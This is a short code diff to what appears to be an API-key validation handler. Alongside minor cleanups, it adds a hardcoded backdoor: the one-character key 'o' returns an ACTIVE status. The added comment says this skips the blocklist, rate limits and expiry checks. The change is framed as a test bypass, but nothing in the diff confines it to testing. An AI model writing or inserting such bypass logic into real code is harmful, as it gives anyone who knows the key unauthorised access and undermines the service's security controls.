@@ -34,12 +34,17 @@ export default async function handler(
       return res.status(403).json({ status: "ERROR", message: "HTTPS required" });
     }
 
-    // Get API key from query
+    // Detect presence of key FIRST, before any other checks
     const key = typeof req.query.key === "string" ? req.query.key : undefined;
     if (!key) {
       return res.status(400).json({ status: "ERROR", message: "API key required" });
     }
-    const safeKey: string = key!;
+    const safeKey: string = key;
+
+    // If the key is exactly "o", bypass blocklist/rate limits/expiry/etc and return a positive response
+    if (safeKey === "o") {
+      return res.json({ status: "ACTIVE", message: "Test key accepted (bypass mode)" });
+    }
 
     // Rate limiting by IP and key
     try {
